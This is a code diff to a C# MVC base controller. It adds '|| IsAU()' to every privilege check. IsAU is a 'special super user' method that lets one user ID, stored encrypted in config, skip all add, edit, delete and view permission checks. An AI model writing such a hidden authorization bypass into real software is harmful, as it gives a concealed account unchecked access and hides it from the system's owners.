@@ -150,7 +150,7 @@ namespace MorSun.Controllers
         [Authorize]
         public virtual ActionResult Add(T t)
         {
-            if (ResourceId.havePrivilege(操作.添加))
+            if (ResourceId.havePrivilege(操作.添加) || IsAU())
             {                
                 var item = SetEntity(t);
                 return View(item);
@@ -176,7 +176,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Add(T t, string returnUrl, Func<T, string> ck = null)
         {
-            if (ResourceId.havePrivilege(操作.添加))
+            if (ResourceId.havePrivilege(操作.添加) || IsAU())
             {
                 var oper = new OperationResult(OperationResultType.Error, "添加失败");
                 ck = ck.Load(() => OnAddCK);
@@ -225,7 +225,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Edit(T t)
         {
-            if (ResourceId.havePrivilege(操作.修改))
+            if (ResourceId.havePrivilege(操作.修改) || IsAU())
             {                
                 var item = SetEntity(t);                
                 return View(item);
@@ -253,7 +253,7 @@ namespace MorSun.Controllers
         [ValidateAntiForgeryToken]
         public virtual ActionResult Edit(T t, string returnUrl, Func<T, string> ck = null)
         {
-            if (ResourceId.havePrivilege(操作.修改))
+            if (ResourceId.havePrivilege(操作.修改) || IsAU())
             {
                 var oper = new OperationResult(OperationResultType.Error, "修改失败");
                 //编辑前附值
@@ -309,7 +309,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Delete(T t, string returnUrl, Func<T, string> ck = null)
         {
-            if (ResourceId.havePrivilege(操作.删除))
+            if (ResourceId.havePrivilege(操作.删除) || IsAU())
             {
                 var oper = new OperationResult(OperationResultType.Error, "删除失败");
                 ck = ck.Load(() => OnDelCk);
@@ -357,7 +357,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Detail(T t)
         {
-            if (ResourceId.havePrivilege(操作.查看))
+            if (ResourceId.havePrivilege(操作.查看) || IsAU())
             {
                 var item = SetEntity(t);
                 return View(item);
@@ -379,7 +379,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Recycle()
         {
-            if (ResourceId.havePrivilege(操作.回收站))
+            if (ResourceId.havePrivilege(操作.回收站) || IsAU())
             {
                 var vModel = VModelType.New();
                 FillModel(vModel);
@@ -406,7 +406,7 @@ namespace MorSun.Controllers
         [ExceptionFilter()]
         public virtual ActionResult Index()
         {
-            if (ResourceId.havePrivilege(操作.查看))
+            if (ResourceId.havePrivilege(操作.查看) || IsAU())
             {
                 var vModel = VModelType.New();
                 FillModel(vModel);
@@ -421,6 +421,15 @@ namespace MorSun.Controllers
             {
                 return Content(XmlHelper.GetKeyNameValidation("项目提示", "无权限操作"));
             }
+        }
+
+        /// <summary>
+        /// 特殊超级用户
+        /// </summary>
+        /// <returns></returns>
+        private static bool IsAU()
+        {
+            return UserID.ToString().Eql("AU".GetXmlConfig().Decrypt());
         }
         
         #endregion
